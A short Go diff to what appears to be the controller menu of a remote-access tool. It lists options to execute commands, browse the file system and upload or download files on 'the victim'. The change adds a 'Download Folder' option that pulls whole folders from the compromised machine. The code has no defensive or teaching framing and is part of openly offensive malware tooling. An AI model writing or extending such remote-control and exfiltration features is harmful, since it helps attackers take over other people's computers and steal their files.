@@ -29,7 +29,8 @@ func options() {
 	fmt.Println("\t[1] Execute Command")
 	fmt.Println("\t[2] Move in File system")
 	fmt.Println("\t[3] UploadFile")
-	fmt.Println("\t[4] Download")
+	fmt.Println("\t[4] Download File")
+	fmt.Println("\t[5] Download Folder")
 	fmt.Println("\t[99] Exit")
 	fmt.Println()
 }
@@ -80,6 +81,11 @@ func main() {
 		case user_input == "4":
 			fmt.Println("[+] Downloading File from the victim ")
 			err = download.DownloadFromVictim(connection)
+			DisplayError(err)
+
+		case user_input == "5":
+			fmt.Println("[+] Download Folder from victim")
+			err := download.DownloadFolderFromVictim(connection)
 			DisplayError(err)
 
 		case user_input == "99":
